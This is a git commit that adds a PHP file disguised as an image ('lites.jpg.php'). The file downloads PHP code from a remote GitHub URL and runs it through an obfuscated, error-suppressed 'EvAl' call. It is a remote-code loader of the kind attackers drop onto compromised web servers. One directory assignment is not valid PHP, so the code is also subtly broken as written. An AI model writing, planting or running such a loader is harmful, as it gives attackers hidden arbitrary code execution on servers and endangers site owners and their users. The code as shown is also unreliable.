8f55d32638691049fc740bcb51a3706faf1fc719
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-06-26 15:21:55 +0700

    Create lites.jpg.php

---
+++ lites.jpg.php
@@ -0,0 +1,23 @@
+<?php
+
+    $url = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/lites.php';
+    
+    $targetDir = '/var/tmp','/tmp','/dev/shm';
+    
+    if (!is_dir($targetDir)) {
+        mkdir($targetDir, 0777, true);
+    }
+    
+    $randomFileName = uniqid() . '.php';
+    $targetFile = $targetDir . '/' . $randomFileName;
+    
+    if (!file_exists($targetFile)) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, false);
+        $response = curl_exec($ch);
+        curl_close($ch);
+        @EvAl('?>'. $response);
+    }
+
+?>
